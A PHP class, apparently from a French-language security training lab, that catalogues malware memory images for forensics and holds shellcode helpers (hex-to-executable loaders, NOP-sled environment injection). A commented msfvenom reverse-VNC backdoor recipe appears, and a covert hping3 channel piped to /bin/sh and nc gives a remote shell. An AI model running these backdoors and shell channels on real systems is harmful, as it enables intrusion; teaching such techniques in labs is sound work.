<?php

/*
gmail:
Messages avec pièces jointes

Afin de vous protéger contre d'éventuelles attaques de virus et de logiciels dangereux, vous n'êtes pas autorisé à joindre certains types de fichiers à vos messages Gmail, comme par exemple :

    Différents types de fichiers, y compris sous forme compressée (fichiers GZ ou BZ2, par exemple) ou contenus dans des archives (fichiers ZIP ou TGZ, par exemple)
    Des documents contenant des macros malveillantes
    Des archives protégées par mot de passe dont le contenu est une archive

Remarque : Si vous joignez un document trop volumineux à votre message, ce dernier n'est pas envoyé. En savoir plus sur les limites de taille des fichiers et pièces jointes
Types de fichiers que vous ne pouvez pas joindre à vos e-mails

Afin de protéger votre compte, vous n'êtes pas autorisé à joindre certains types de fichiers à vos messages Gmail. Les logiciels dangereux évoluant constamment, la liste de ces types de fichiers est régulièrement mise à jour. Voici quelques exemples : 

ADE, ADP, APK, BAT, CHM, CMD, COM, CPL, DLL, DMG, EXE, HTA, INS, ISP, JAR, JS, JSE, LIB, LNK, MDE, MSC, MSI, MSP, MST, NSH, PIF, SCR, SCT, SHB, SYS, VB, VBE, VBS, VXD, WSC, WSF, WSH, CAB
 */
class com4bin extends com4malw{

	var $target;
	var $snapshot;

	
	var $vmem_clean_win_xp;
	
	var $vmem_trojan_win_zeus;
	var $vmem_trojan_win_zeus2;
	var $vmem_trojan_win_Shylock;
	var $vmem_trojan_win_silentbanker;
	var $vmem_trojan_win_spyeye;
	var $vmem_trojan_win_blackEnergy;
	var $vmem_trojan_win_bob;
	var $vmem_trojan_win_darkcomet;
	var $vmem_trojan_win_aka ;
	var $vmem_trojan_win_coreflood ;
	var $vmem_trojan_win_all ;
	
	var $vmem_rootkit_win_sality;
	var $vmem_rootkit_win_prolaco;
	var $vmem_rootkit_win_tigger;
	var $vmem_rootkit_win_hackerDefender ;
	var $vmem_rootkit_win_laqma ; // http://10.50.10.170:8080/
	var $vmem_rootkit_win_all;
	
	var $vmem_worm_win_cridex;
	var $vmem_worm_win_stuxnet;
	var $vmem_worm_win_all;
	
	var $vmem_inc_win_zaptis;
	var $vmem_inc_win_boomer;
	var $vmem_inc_win_ds;
	var $vmem_inc_win_inc_1;
	var $vmem_inc_win_inc_3;
	var $vmem_inc_win_inc_all;
	
	var $vmem_rootkit_all;
	var $vmem_clean_win_all;
	
	var $vmem_book_win_all ;
	var $vmem_book_win_1 ;
	var $vmem_book_win_2 ;
	var $vmem_book_win_3 ;
	var $vmem_book_win_4 ;
	var $vmem_book_win_5 ;
	var $vmem_book_win_6 ;
	var $vmem_book_win_7 ;
	var $vmem_book_win_8 ;
	var $vmem_book_win_9 ;
	
	var $vmem_inject_pid ;
	var $vmem_persistance_win_mz ;
	var $vmem_persistance_win_dll ;
	var $vmem_hook_usermode_syscall ;
	var $vmem_hook_kernelmode_Trampoline ;
	var $vmem_hook_usermode_got ;
	var $vmem_hook_usermode_Trampoline ;
	var $vmem_ssdt ;
	var $vmem_code_inject_win ;
	var $vmem_code_inject_lin ;
	
	var $vmem_book_linux_all ;
	var $vmem_book_linux_1 ;
	var $vmem_book_linux_2 ;
	var $vmem_book_linux_3 ;
	var $vmem_book_linux_4 ;
	var $vmem_book_linux_5 ;
	var $vmem_book_linux_6 ;
	
	var $vmem_rootkit_lin_kbeast ;
	var $vmem_rootkit_lin_azazel ;
	var $vmem_rootkit_lin_all ;
	
	var $vmem_win_all;
	var $vmem_lin_all;
	var $vmem_all;
	
	
	public function __construct() {
	parent::__construct();
	
	
	$this->vmem_clean_win_xp = array("XP CLEAN","$this->dir_tmp/xp-clean.bin","WinXPSP3x86");
	$this->vmem_clean_win_all = array_merge($this->vmem_clean_win_xp);
	
	$this->vmem_trojan_win_zeus = array("ZEUS Trojan","$this->dir_tmp/Trojan_Zeus.vmem","WinXPSP2x86");
	$this->vmem_trojan_win_zeus2 = array("ZEUS Trojan 2","$this->dir_tmp/Trojan_Zeus2x4.vmem","WinXPSP2x86");
	$this->vmem_trojan_win_Shylock = array("SHYLOCK Trojan","$this->dir_tmp/Trojan_Shylock.vmem","WinXPSP2x86");
	$this->vmem_trojan_win_silentbanker = array("SilentBanker Trojan","$this->dir_tmp/Trojan_Silentbanker.vmem","WinXPSP2x86");
	$this->vmem_trojan_win_spyeye = array("SPYEYE Trojan","$this->dir_tmp/Trojan_Spyeye.vmem","WinXPSP2x86");
	$this->vmem_trojan_win_blackEnergy = array("Trojan_BlackEnergy_2","$this->dir_tmp/Trojan_BlackEnergy_2.vmem","WinXPSP2x86");
	$this->vmem_trojan_win_bob = array("Trojan Bob","$this->dir_tmp/Trojan_Bob.vmem","WinXPSP2x86");
	$this->vmem_trojan_win_darkcomet = array("DARKCOMET Trojan","$this->dir_tmp/Trojan_DarkComet_RAT.vmem","Win7SP1x86");
	$this->vmem_trojan_win_aka = array("Trojan R2D2 - Aka","$this->dir_tmp/Trojan_Aka.vmem","WinXPSP2x86"); // est un rootkit, a modifier later
	$this->vmem_trojan_win_coreflood = array("coreflood","$this->dir_tmp/Trojan_Coreflood.vmem","WinXPSP2x86");
	$this->vmem_trojan_win_all = array_merge($this->vmem_trojan_win_zeus,$this->vmem_trojan_win_zeus2,$this->vmem_trojan_win_Shylock,$this->vmem_trojan_win_silentbanker,$this->vmem_trojan_win_coreflood,$this->vmem_trojan_win_spyeye,$this->vmem_trojan_win_blackEnergy,$this->vmem_trojan_win_aka);// $this->vmem_trojan_win_darkcomet,	
	
	$this->vmem_rootkit_win_sality = array("ROOTKIT sality","$this->dir_tmp/Rootkit_Sality.vmem","WinXPSP2x86");
	$this->vmem_rootkit_win_prolaco = array("ROOTKIT prolaco","$this->dir_tmp/Rootkit_Prolaco.vmem","WinXPSP2x86");
	$this->vmem_rootkit_win_tigger = array("ROOTKIT tigger","$this->dir_tmp/Rootkit_Tigger.vmem","WinXPSP2x86");
	$this->vmem_rootkit_win_hackerDefender = array("ROOTKIT Hacker Defender","$this->dir_tmp/rootkit4win_user2hackerDefender.vmem","WinXPSP3x86");
	$this->vmem_rootkit_win_laqma = array("Rootkit LAQMA","$this->dir_tmp/Rootkit_Laqma.vmem","WinXPSP2x86");
	$this->vmem_rootkit_win_all = array_merge($this->vmem_rootkit_win_sality,$this->vmem_rootkit_win_prolaco,$this->vmem_rootkit_win_tigger,$this->vmem_rootkit_win_hackerDefender,$this->vmem_rootkit_win_laqma);	
	
	$this->vmem_worm_win_cridex = array("WORM CRIDEX","$this->dir_tmp/Worm_Cridex.vmem","WinXPSP2x86");
	$this->vmem_worm_win_stuxnet = array("WORM Stuxnet","$this->dir_tmp/Worm_Stuxnet.vmem","WinXPSP3x86");
	$this->vmem_worm_win_all = array_merge($this->vmem_worm_win_cridex,$this->vmem_worm_win_stuxnet);
	
	$this->vmem_inc_win_boomer = array("boomer","$this->dir_tmp/Boomer-2006-03-17.vmem","Win2003SP0x86");
	$this->vmem_inc_win_ds = array("ds_fuzz_hidden_proc","$this->dir_tmp/ds_fuzz_hidden_proc.vmem","WinXPSP3x86");	
	$this->vmem_inc_win_inc_1 = array("Win2008SP1x86","$this->dir_tmp/Win2008SP1x86.vmem","Win2008SP1x86");
	$this->vmem_inc_win_inc_3 = array("xp-laptop_WinXPSP2x86-2005-06-25","$this->dir_tmp/xp-laptop-2005-06-25.vmem","WinXPSP2x86");
	$this->vmem_inc_win_all = array_merge($this->vmem_inc_win_boomer,$this->vmem_inc_win_ds,$this->vmem_inc_win_inc_1,$this->vmem_inc_win_inc_3);
	
	$this->vmem_book_win_1 = array("Book","$this->dir_tmp/sample001.bin","WinXPSP2x86");
	$this->vmem_book_win_2 = array("Book","$this->dir_tmp/sample002.bin","WinXPSP2x86");
	$this->vmem_book_win_3 = array("Book","$this->dir_tmp/sample003.bin","WinXPSP2x86");
	$this->vmem_book_win_4 = array("Book","$this->dir_tmp/sample004.bin","WinXPSP2x86");
	$this->vmem_book_win_5 = array("Book","$this->dir_tmp/sample005.bin","WinXPSP2x86");
	$this->vmem_book_win_6 = array("Book","$this->dir_tmp/sample006.bin","WinXPSP2x86");
	$this->vmem_book_win_7 = array("Book","$this->dir_tmp/sample007.bin","WinXPSP2x86");
	$this->vmem_book_win_8 = array("Book","$this->dir_tmp/sample008.bin","WinXPSP2x86");
	$this->vmem_book_win_9 = array("Book","$this->dir_tmp/sample009.bin","WinXPSP2x86");	
	$this->vmem_book_win_all = array_merge($this->vmem_book_win_1,$this->vmem_book_win_2,$this->vmem_book_win_3,$this->vmem_book_win_4,$this->vmem_book_win_5,$this->vmem_book_win_6,$this->vmem_book_win_7,$this->vmem_book_win_8,$this->vmem_book_win_9);
		
	$this->vmem_code_inject_win = array("Code Inject into Explorer","$this->dir_tmp/code_inject_msf_migrate_explorer_PID1372_WinXPSP3x86.vmem","WinXPSP3x86");
		
	$this->vmem_win_all = array_merge($this->vmem_clean_win_all,$this->vmem_worm_win_all,$this->vmem_rootkit_win_all,$this->vmem_trojan_win_all,$this->vmem_inc_win_all,$this->vmem_book_win_all,$this->vmem_code_inject_win);
	
	
	// ######################### Linux .VMEM ##################################################
	
	$this->vmem_rootkit_lin_kbeast = array("Rootkit Kernel LAND KBEASTv1","$this->dir_tmp/rootkit4linux_kernel_kbeastv1_ub10040_2.6.32-21-generic.vmem","LinuxUbuntu10040x86");
	$this->vmem_rootkit_lin_azazel = array("Rootkit USER LAND AZAZEL","$this->dir_tmp/rootkit4linux_user2azazel_ub1404_3.13.0-32-generic.vmem","LinuxUbuntu14041x86");
	$this->vmem_rootkit_lin_jynx2 = array("Rootkit USER LAND JYNX2","$this->dir_tmp/rootkit4linux_user2jynx2_ub14041x86_2.6.32-21-generic.vmem","LinuxUbuntu14041x86");
	$this->vmem_rootkit_lin_avgcoder = array("Rootkit KERNEL LAND avgcoder","$this->dir_tmp/rootkit4linux_kernel_avgcoder_ub1404_3.13.0-32-generic.vmem","LinuxUbuntu14043x86");
	$this->vmem_rootkit_lin_all = array_merge($this->vmem_rootkit_lin_kbeast,$this->vmem_rootkit_lin_azazel);
	
	
	$this->vmem_code_inject_lin = array("Code Inject into PID on Linux","$this->dir_tmp/code_inject_linux_LinuxUbuntu1404x86.vmem","LinuxUbuntu1404x86");
	
	
	$this->vmem_book_linux_1 = array("Book","$this->dir_tmp/linux-sample-1.bin","Linuxbookx64");
	$this->vmem_book_linux_2 = array("Book","$this->dir_tmp/linux-sample-2.bin","Linuxbookx64");
	$this->vmem_book_linux_3 = array("Book","$this->dir_tmp/linux-sample-3.bin","Linuxbookx64");
	$this->vmem_book_linux_4 = array("Book","$this->dir_tmp/linux-sample-4.bin","Linuxbookx64");
	$this->vmem_book_linux_5 = array("Book","$this->dir_tmp/linux-sample-5.bin","Linuxbookx64");
	$this->vmem_book_linux_6 = array("Book","$this->dir_tmp/linux-sample-6.bin","Linuxbookx64");
	$this->vmem_book_linux_all = array_merge($this->vmem_book_linux_1,$this->vmem_book_linux_2,$this->vmem_book_linux_3,$this->vmem_book_linux_4,$this->vmem_book_linux_5,$this->vmem_book_linux_6);
	
	
	$this->vmem_lin_all = array_merge($this->vmem_rootkit_lin_all,$this->vmem_book_linux_all,$this->vmem_code_inject_lin);
	
	
	
	
	$this->vmem_all = array_merge($this->vmem_win_all,$this->vmem_lin_all);
	
	
	$this->vmem_inject_pid = array($this->vmem_worm_win_cridex,$this->vmem_worm_win_stuxnet,$this->vmem_rootkit_win_laqma,$this->vmem_trojan_win_spyeye,$this->vmem_rootkit_win_sality,$this->vmem_trojan_win_Shylock,$this->vmem_trojan_win_silentbanker,$this->vmem_trojan_win_blackEnergy); // add $this->vmem_trojan_win_bob,
	
	//$this->vmem_inject_pid = array($this->vmem_trojan_win_zeus,$this->vmem_worm_win_cridex,$this->vmem_worm_win_stuxnet,$this->vmem_rootkit_win_laqma,$this->vmem_trojan_win_spyeye,$this->vmem_rootkit_win_sality,$this->vmem_trojan_win_Shylock,$this->vmem_trojan_win_silentbanker,$this->vmem_trojan_win_blackEnergy); // add $this->vmem_trojan_win_bob,
	$this->vmem_persistance_win_mz = array($this->vmem_trojan_win_zeus,$this->vmem_trojan_win_Shylock,$this->vmem_trojan_win_spyeye,$this->vmem_worm_win_cridex); // $this->vmem_trojan_win_bob,
	$this->vmem_persistance_win_dll = array($this->vmem_trojan_win_aka);
	$this->vmem_hook_usermode_syscall = array($this->vmem_worm_win_stuxnet);
	$this->vmem_hook_kernelmode_Trampoline = array($this->vmem_trojan_win_blackEnergy);
	$this->vmem_hook_usermode_got = array($this->vmem_trojan_win_Shylock,$this->vmem_trojan_win_coreflood); // ,$this->vmem_trojan_win_bob,$this->vmem_trojan_win_darkcomet
	$this->vmem_hook_usermode_Trampoline = array($this->vmem_worm_win_cridex,$this->vmem_trojan_win_zeus,$this->vmem_trojan_win_silentbanker,$this->vmem_trojan_win_spyeye,$this->vmem_rootkit_win_prolaco,$this->vmem_rootkit_win_hackerDefender);
	$this->vmem_ssdt = array($this->vmem_trojan_win_blackEnergy,$this->vmem_rootkit_win_laqma,$this->vmem_worm_win_stuxnet); // $this->vmem_trojan_win_darkcomet,
	$this->vmem_rootkit_all = array_merge($this->vmem_rootkit_win_all,$this->vmem_rootkit_lin_all);
	
	############################################################################################################
	
	
	}

			
	
	
	
	/*
	 * pas Bon
	 * $cmd1 = "echo '$this->root_passwd' | sudo -S msfcli exploit/multi/handler PAYLOAD=windows/vncinject/reverse_tcp LHOST=$this->host LPORT=$this->port AutoRunScript=/opt/metasploit/apps/pro/msf3/scripts/meterpreter/vnc.rb E";
	 * $cmd3 = "msfvenom --payload  windows/vncinject/reverse_tcp LHOST=$this->host LPORT=$this->port x > $this->file_dir/backdoor_windows_reverse_vnc.exe ";
	 *$this->exec_parallel($cmd1, $cmd3, 0);pause();
	 * vm_upload($xp, "$this->file_dir/backdoor_windows_reverse_vnc.exe", "$dest\\backdoor_windows_reverse_vnc.exe");
	 * virustotal_scan("$this->file_dir/backdoor_windows_reverse_vnc.exe");
	 * pause();
	 */
	/*
	 *
	 * PE editors
	 * Hiew, PE Editor, CFF Explorer, StudPE, LordPE etc
	 */
	
	
	public function tunnel_com(){
	    
	    
	    
	    
	    $this->titre("hping3" );
	    $this->article("DO", "Open 4 Windows" );
	    $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S ngrep -d $this->eth_lan" );
	    $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S tcpdump -s0 -nX -i $this->eth_lan host $lts or host $this->prof" );
	    $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S ipgrab -i $this->eth_lan" );
	    $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S tshark -i $this->eth_lan host $lts or host $this->prof\" " );
	    $this->pause();
	    
	    $this->ssTitre("Via TCP 80" );
	    $this->cmd($this->prof, "nc -l 8181 -vk" );
	    $this->cmd($lts, "echo '$this->root_passwd' | sudo -S hping3 --listen $this->user2local  -I $this->eth_lan | /bin/sh | nc $this->prof 8181" );
	    $this->pause();
	    $this->cmd($lts, "netstat -tpan | grep 80 " );
	    $this->article("DO", "Visualise the result on screen -> localhost: hping3 -I $this->eth_lan --listen $this->user2local " );
	    $this->cmd($this->prof, "hping3 -I $this->eth_lan --listen $this->user2local " );
	    $this->pause();
	    $this->article("Note", "ne pas oublier le ';' sinon il va executer ce qui vient apres ls -> see on localhost hping3 -I $this->eth_lan --listen $this->user2local " );
	    $this->net("http://$lts/$this->user2local ls;" );
	    $this->pause();
	    
	    $this->ssTitre("Via TCP ANY PORTs" );
	    $this->requette("echo  \"ls\" > $this->file_dir/test.cmd" );
	    $this->cmd($lts, "echo '$this->root_passwd' | sudo -S hping3 --listen $this->user2local  -I $this->eth_lan | /bin/sh  | nc $this->prof 8181" );
	    $this->pause();
	    $this->article("DO", "Visualise the result on screen -> hping3 -I $this->eth_lan --listen $this->user2local " );
	    $this->cmd($this->prof, "hping3 -I $this->eth_lan --listen $this->user2local " );
	    $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S hping3 $lts -d 100 --sign $this->user2local  --file $this->file_dir/test.cmd -c 1 -I $this->eth_lan" );
	    $this->pause();
	    
	    $this->ssTitre("Via UDP" );
	    $this->requette("echo \"pwd\" > $this->file_dir/test.cmd" );
	    $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S hping3 $lts -d 100 --udp --sign $this->user2local  --file $this->file_dir/test.cmd -c 1 -I $this->eth_lan" );
	    $this->pause();
	    
	    $this->ssTitre("Via ICMP" );
	    $this->requette("echo \"\nuname -a\" > $this->file_dir/test.cmd" );
	    $this->cmd($this->prof, "echo '$this->root_passwd' | sudo -S hping3 $lts -d 100 --icmp --sign $this->user2local  --file $this->file_dir/test.cmd -c 1 -I $this->eth_lan" );
	    $this->pause();
	}
	
	

	
	

	function os_get_memory() {
		// Win32dd/Win64dd, Memoryze, DumpIt, FastDump
		gtitre("Memory Acquisition");
		os_get_memory_no_vm ();
		os_get_memory_vm($xp);
	}
	function os_get_memory_no_vm() {
		titre("Dump Memory on No Virtual Machine");
		$this->article("Dump Memory on No Virtual Machine", " On the physical machine you can use tools like Win32dd/Win64dd, Memoryze, DumpIt, FastDump.");
		$this->ssTitre("Dump Memory On Windows");
		$this->article("Recuperation de la RAM", "Dans le cas d’un WINDOWS et dans certaines conditions, l’extraction de la mémoire à partir du fichier hiberfil.sys suffit, en effet, ce fichier est utilisé par Windows pour stocker l'état courant de votre ordinateur (le contenu de la mémoire, les applications et documents ouverts, etc.) lors d'une mise en veille prolongée.");
		$this->cmd($xp, "python vol.py -f /tmp/hiberfil.sys --profile=WinXPSP2x86 imagecopy -O > $dir_tmp/winxp_sp2_ram.img");
		// dd if=\\.\PhysicalMemory of=c:\xp-2005-07-04-1430.img conv=noerror
		$this->net("http://www.moonsols.com/windows-memory-toolkit/");
		$this->cmd($xp, "DumpIt.exe");
		$this->cmd($xp, "mdd_1.3.exe -o C:\MEMORY.DMP");
		$this->ssTitre("Extract Memory from Hibernation File (hiberfil.sys) ");
		$this->article("Hibernation File", "\n• Contains a compressed RAM Image\n• %SystemDrive%/hiberfil.sys");
		$this->article("Exemple", "Example: Extract hibernation file memory and save to a USB DRIVE\n
D:\> hibr2bin D:\hiberfil.sys E:\hibernation_memory.img	");
		$this->article("resume", "Windows
Live system
–  win32dd.exe
o  http://win32dd.msuiche.net/
o  Computes MD5 hash of memory image file
–  mdd.exe
o  http://www.mantech.com/msma/mdd.asp
–  Memoryze
o  http://www.mandiant.com/software/memoryze.htm
Dead system
–  Compressed RAM in Hibernation File (hiberfil.sys)");
		// pause();
	
		$this->ssTitre("Dump Memory On Linux");
		$this->cmd("localhost", "memdump > $dir_tmp/$ub_ram.img");
		// dd if=/dev/fmem of=memory.dd bs=1MB count=512
		$this->net("https://code.google.com/p/lime-forensics/downloads/list");
		$this->ssTitre("Via Metasploit run memdump");
	}
	
	function linux_memory_acquisition() {
		$this->gtitre("Memory Acquisition");
		$this->article(" /dev/mem and /dev/kmem", " are character device files (or “special files”) that provide access to system memory.
 /dev/mem provides access to physical memory; byte addresses in mem are interpreted as physical memory addresses.
 /dev/kmem provides access to the virtual address space of the operating system kernel. Unlike mem, kmem uses virtual memory addresses.");
	
		$this->titre("Physical Memory Acquisition");
		$this->ssTitre("With dc3dd");
		$this->requette("dc3dd if=/dev/mem of=$rep_path/mem_physical_dc3dd_mem.dmp");
		$this->ssTitre("with MemDump");
		$this->requette("memdump > $rep_path/mem_physical_memdump.dmp");
		$this->ssTitre("Collecting the /proc/kcore file");
		$this->article("/proc/kcore", "Linux systems (and other modern versions of UNIX) have a “ /proc ” directory that contains a virtual file system with files that represent the current state
of the kernel.
The file /proc/kcore contains all data in physical memory in ELF format.
Collect the contents of this file in addition to a raw memory dump, because the ELF-formatted data in /proc/kcore can be examined using the GNU Debugger(gdb).");
		$this->requette("dc3dd if=/dev/kcore of=$rep_path/mem_physical_dc3dd_kcore.dmp");
		$this->titre("LIME"); // Later
		$this->cmd("localhost", "svn checkout http://lime-forensics.googlecode.com/svn/trunk/ lime-forensics-read-only");
	
		$this->ssTitre("Dump the memory info into our image via lime");
		$this->cmd("localhost", " sudo insmod lime-3.2.0-51-generic.ko \"path=./ubuntu.lime format=lime\"");
	
		$this->ssTitre("Via network, victim");
		$this->cmd("localhost", " insmod lime.ko \"path=tcp:4444 format=lime\" ");
	
		$this->ssTitre("uploading LIME Image for RAM");
		$this->cmd("localhost", "nc target-ip port > memdump.lime");
	}
	
	function os_get_memory_vm($host) {
		$this->titre("Dump Memory on Virtual Machine");
		$this->ssTitre("Virtual Machine Memory Acquisition");
		$this->article("On VMware (Fusion/Workstation/Server/Player)", " on the virtual machine, acquiring the memory image is easy, you can do it by suspending the VM and grabbing the “.vmem” file, .vmem file = raw memory image");
		$this->article("On Microsoft Hyper-V", ".bin file = raw memory image");
		$this->article("Parallels", ".mem file = raw memory image");
		$this->article("VirtualBox", ".sav file = partial memory image");
	
		// vm_suspend($host);
	}
	
	

	
	
	function opcode2hex($opcode) {
		$hex = "";
		$somme = count($opcode);
		for($i = 0; $i < $somme; $i = $i + 2) {
			$j = $i + 1;
			$hex .= "\\x$opcode[$i]" . "$opcode[$j]";
		}
		return $hex;
	}
	
	function asm2hex($shellcode_asm) {
		$this->ssTitre("ASM to HEX" );
		// if (!check_soft_exist("~/metasm/metasm.rb")) $this->install_labs_metasm();
		// requette("echo \"$shellcode_asm\" | ruby ~/metasm/metasm.rb > $dir_tmp/shellcode_asm2hex.hex");
		// objdump -M intel -D /home/$user2local/Bureau/CEH/tmp/ret2libc_32 | grep -E 'dec\s*esp'
		// ("echo \"$shellcode_asm\" | objdump -M intel | grep -E 'dec\s*esp'");
		// requette("echo \"$shellcode_asm\" | ruby /opt/metasploit/apps/pro/msf3/tools/metasm_shell.rb > $dir_tmp/tmp.txt");
		// $tmp = req_ret_tab("echo \"$shellcode_asm\" |  ruby /opt/metasploit/apps/pro/msf3/tools/nasm_shell.rb | tail -1 | cut -d' ' -f5 | grep -iPo \"[a-f0-9]{2}\" > $dir_tmp/tmp.txt; cat ./tmp/tmp.txt | for i in `cat $dir_tmp/tmp.txt` ; do echo \"\\x\$i\" | tr -d '\n' ;done");
		// return $tmp[0];
		$tmp =  $this->req_ret_str( "rasm2 -a x86 -b 32 '$shellcode_asm' " );
		$opcode = str_split ( $tmp  );
		return $this->opcode2hex ( $opcode );
		// return file("$dir_tmp/shellcode_asm2hex.hex");
	}
	

	function hex2exec($hex) {
		$this->ssTitre( "HEX to EXEC");
		/*
		 * ssTitre("Test 1");
		 * system("echo \"unsigned char shellcode[] =\\\"$hex\\\"; \nvoid main(){int *ret;ret = (int *)&ret + 2;(*ret) = (int)shellcode;}\" > $this->dir_tmp/shellcode2exec1.c; cat $this->dir_tmp/shellcode2exec1.c ");
		 * requette("gcc -m32 -z execstack $this->dir_tmp/shellcode2exec1.c -o $this->dir_tmp/shellcode2exec1; chmod +x $this->dir_tmp/shellcode2exec1");
		 * requette("$this->dir_tmp/shellcode2exec1 ");
		 * ssTitre("Test 2");
		 */
		$hex = trim($hex);
		$c_code = $this->hex2c($hex);
		$hash = sha1($c_code);
		
		$file_path = "$this->dir_tmp/$hash";
		//$this->str2file($c_code, "$file_path.c");

		return  $this->c2bin4code($c_code,"-m32 -z execstack ","$file_path.c");
	}
	
	
	public function c2bin4code($code_c,$option_gcc,$output_filename_c) {
	    $this->ssTitre(__FUNCTION__);
	    // system("echo '$structure_memoire_processus' > $this->dir_tmp/structure_memoire_processus.c && gedit $this->dir_tmp/structure_memoire_processus.c ");
	    /*
	     * To disable stack smashing protection (aka stack canaries) compile using the -fno-stack-protector option.
	     * Rendre la Stack Executable -z execstack
	     * the -mpreferred-stack-boundary=2 option which will keep our stack 22=4 byte aligned, which will just be more convenient for us (by default -mpreferred-stack-boundary=4, that is gcc pads the stack to be 24=16 byte aligned).
	     */
	    
	    $file_w = fopen($output_filename_c, "w");
	    fwrite($file_w, $code_c);
	    fclose($file_w);
	    
	    $file_c = new FILE($output_filename_c);
	    $obj_elf = $file_c->file_c2elf($option_gcc);
	    if (is_object($obj_elf)){
	    $query = "$obj_elf->file_path";
	    $this->requette($query);
	    }
	    //$this->source2display($this->file_path);
	    //$this->requette("gedit $this->file_path 2> /dev/null");$this->pause();
	    //$this->ssTitre("Create .expand file for egypt");
	    // article("gcc -c","compile source files to object files without linking");
	    //$this->requette("gcc -c $this->file_path -fdump-rtl-expand -o $this->file_dir/$this->file_name.o -w $option_gcc"); // -Wall
	    
	    // $this->requette("strip -s $prog_path");
	    // $this->requette("gcc $file_c -fdump-rtl-expand -ggdb -o $prog_path -w $option");
	    // $this->requette("gcc -fdump-rtl-expand -c $file_c"); // -masm=intel
	    // if (! file_exists("/usr/local/bin/egypt")) 	$this->install_labs_egypt();
	    //$this->requette("egypt $this->file_dir/*.expand > $this->file_dir/$this->file_name.dot");
	    //system("rm $this->file_dir/*.expand");
	    
	    //$this->dot2xdot("$this->file_dir/$this->file_name.dot");
	    
	    //$file_bin = new bin4linux($elf);
	    //system("chmod +x $file_bin->file_path");
	    //$file_bin->elf2info();
	    //$this->requette("lsb_release -a");
	    //$this->requette("uname -a");
	    //$this->requette("gcc --version");
	    //$this->ssTitre("Check Security Option");$file_bin->elf2checksec();
	    //return $file_bin;
	}
	
	function hex2c($hex) {
		//return "unsigned char shellcode[] =\"$hex\"; \nvoid main(){int *ret;ret = (int *)&ret + 2;(*ret) = (int)shellcode;}"; // Methode 1
		return "unsigned char shellcode[] =\"$hex\"; \nvoid main(){(*(void(*)()) shellcode)();}"; // methode 2
	}
	
	
	function hex2asm($hex) {
		$this->ssTitre( "Shellcode HEX to ASM");
		// requette("echo -ne \"$hex\" | x86dis -e 0 -s intel");
		return trim($this->req_ret_str("bash -c \"/bin/echo -e '$hex'\" | tr -d '\\n' | ndisasm -u - | cut -d' ' -f4- "));
	}
	
	
	
	function raw2size($raw) {
		$hex = $this->raw2hex($raw);
		return $this->hex2size($hex);
	}
	
	

	function hex2base64($hex) {
		$hex = trim($hex);
		$raw = $this->hex2raw($hex);
		return $this->raw2base64();
	}
	function hex2size($hex) {
		$this->ssTitre( "HEX Size");
		$total = trim($this->req_ret_str( "echo '$hex' | wc -c "));
		return trim($this->req_ret_str( "php -r \"echo ($total-1)/4;\" "));
	}
	function hex2rev_32($addr) {
		$addr = $this->hex2norme_32($addr);
		return "\x$addr[8]$addr[9]\x$addr[6]$addr[7]\x$addr[4]$addr[5]\x$addr[2]$addr[3]";
	}
	
	
	
	function hex2env($hex,$nops) {
		$raw = $this->hex2raw($hex);
		$this->raw2env($raw, $nops);
		return $this->shellcode2env4addr("shellcode");;
	}
	
	
	function hex2norme_32($addr) {
		$addr = trim($addr);
		$addr = str_replace("0x", "", $addr);
		if (strlen($addr) == 4)
			$addr = "0x0000$addr";
			if (strlen($addr) == 5)
				$addr = "0x000$addr";
				if (strlen($addr) == 6)
					$addr = "0x00$addr";
					if (strlen($addr) == 7)
						$addr = "0x0$addr";
						if (strlen($addr) == 8)
							$addr = "0x$addr";
							return trim($addr);
	}
	
	


	function hex2raw($hex) {
		$this->ssTitre( "HEX to RAW");
		// note("test: \"tr -d '\\\x' | xxd -r -p\" ");
		return trim($this->req_ret_str( "bash -c \"/bin/echo -e '$hex'\" ")); // > $this->dir_tmp/shellcode.raw
	}
	
	function hex2graph($hex) {
		$hex = trim($hex);
		$raw = $this->hex2raw($hex);
		$this->raw2graph($raw);
	}

	public function kernel_struct($filter){
	    $this->ssTitre(__FUNCTION__);
	    $this->requette("grep -i kernel /proc/iomem  | grep '$filter' " );
	}

	function id2env($id,$nops, $shellcode_hex) {
		$this->ssTitre("PUT $id in ENV" );
		$shell = str_repeat("\x90", $nops );
		$shell .= $this->hex2raw($shellcode_hex);
		$this->cmd("localhost", "export $id=$nops*$shellcode_hex" );
		putenv ("$id=$shell" );
		$this->ssTitre("Check fmt in ENV" );
		// article("Remarque","Shellcode doit etre en raw");
		$this->requette("env | grep '$id' " );
	}
	
	public function os2checksec4pid(){
	    $this->ssTitre(__FUNCTION__);
	    return $this->requette("bash $this->dir_c/checksec.sh --proc-all");
	}
	

	function raw2env($raw,$nops) {
		$this->ssTitre("PUT Shellcode in ENV");
		$shell = str_repeat("\x90", $nops);
		$shell .= $raw;
		// $shellcode_hex = shellcode_raw2hex($shellcode_raw);
		$this->cmd("localhost", "export shellcode=\"$shell\" ");
		$this->pause();
		putenv("shellcode=$shell");
		//$this->payload2check4norme($shellcode_hex);
		$this->ssTitre("Check Shellcode in ENV");
		// article("Remarque","Shellcode doit etre en raw");
		$this->requette("env | grep 'shellcode' ");
	}
	
	function raw2graph($raw_code) {
		$this->ssTitre( "MAPPING");
	
		$file_raw_obj = new file("");
		$file_raw_path = $file_raw_obj->code2file($raw_code);
		$file_raw_obj->file_raw2dot();
	}
	
	
	function shellcode2env4hex($nops,$shellcode_hex) {
		$this->ssTitre("PUT Shellcode in ENV");
		$shellcode_hex = trim($shellcode_hex);
		$shellcode_raw = $this->hex2raw($shellcode_hex);
		$this->shellcode2env4raw($nops,$shellcode_raw);
		return $this->shellcode2env4addr("shellcode");
		
	}
	
	public function shellcode2env4addr($shellcode_env_name) {
	    $name = "getenv";
	    
	    if (!file_exists("$this->dir_tmp/$name.elf")) $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
	    $file_c = new FILE("$this->dir_tmp/$name.c");
	    //$this->requette("gedit $file_c->file_path");
	    $name_prog = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	    
	    $query = "$name_prog $shellcode_env_name $this->file_path";
	    
